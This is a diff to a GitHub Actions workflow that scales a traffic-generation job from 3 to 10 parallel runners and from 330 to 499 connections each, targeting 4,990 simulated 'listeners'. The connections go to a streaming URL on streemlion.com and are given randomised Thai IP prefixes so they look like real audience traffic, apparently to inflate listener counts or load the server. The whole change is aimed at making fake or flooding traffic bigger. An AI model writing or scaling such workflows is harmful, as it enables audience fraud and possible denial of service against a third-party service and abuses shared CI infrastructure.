@@ -13,7 +13,8 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        RUNNER_ID: [1, 2, 3]
+        # DISTRIBUTE INTO 10 RUNNERS TO REACH 4,990 TOTAL LISTENERS
+        RUNNER_ID: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
     steps:
       - name: 1. PRE-LOAD ENVIRONMENT AND TUNING SYSTEM NETWORK SOCKETS
         run: |
@@ -31,7 +32,7 @@ jobs:
 
       - name: 2. GENERATE HIGH-DENSITY THAI TRAFFIC MATRIX SECTOR
         run: |
-          STREAM_URL="https://eagle.streemlion.com/proxy/dvinexc2?mp=/stream"
+          STREAM_URL="https://streemlion.com"
           
           TH_PREFIXES=(
             "1.46" "1.47" "27.55" "49.228" "49.230" "58.8" "58.9" "58.11" "101.108" "101.109" 
@@ -42,9 +43,10 @@ jobs:
           NUM_PREFIXES=${#TH_PREFIXES[@]}
 
           rm -f production_matrix_pool.txt
-          echo "[!] COMPILING 330 HIGH-DENSITY LISTENERS FOR SECTOR ${{ matrix.RUNNER_ID }}..."
+          echo "[!] COMPILING 499 HIGH-DENSITY LISTENERS FOR SECTOR ${{ matrix.RUNNER_ID }}..."
 
-          for i in {1..330}
+          # INCREASE LOOP FROM 330 TO 499 PER RUNNER
+          for i in {1..499}
           do
             RAND_IDX=$(( RANDOM % NUM_PREFIXES ))
             PREFIX=${TH_PREFIXES[$RAND_IDX]}
@@ -75,8 +77,8 @@ jobs:
           done
           echo "[+] SECTOR MATRIX GENERATED SUCCESSFULLY."
 
-      - name: 3. EXECUTE CONTROLLED SUSTAINED INJECTION 330 LISTENERS
+      - name: 3. EXECUTE CONTROLLED SUSTAINED INJECTION 499 LISTENERS
         run: |
-          echo "[!] INJECTING 330 SUSTAINED CONNECTIONS FROM SECTOR RUNNER ${{ matrix.RUNNER_ID }}..."
-          parallel -j 330 < production_matrix_pool.txt || true
+          echo "[!] INJECTING 499 SUSTAINED CONNECTIONS FROM SECTOR RUNNER ${{ matrix.RUNNER_ID }}..."
+          parallel -j 499 < production_matrix_pool.txt || true
           echo "[+] WORKFLOW SECTOR TIMELINE COMPLETED."
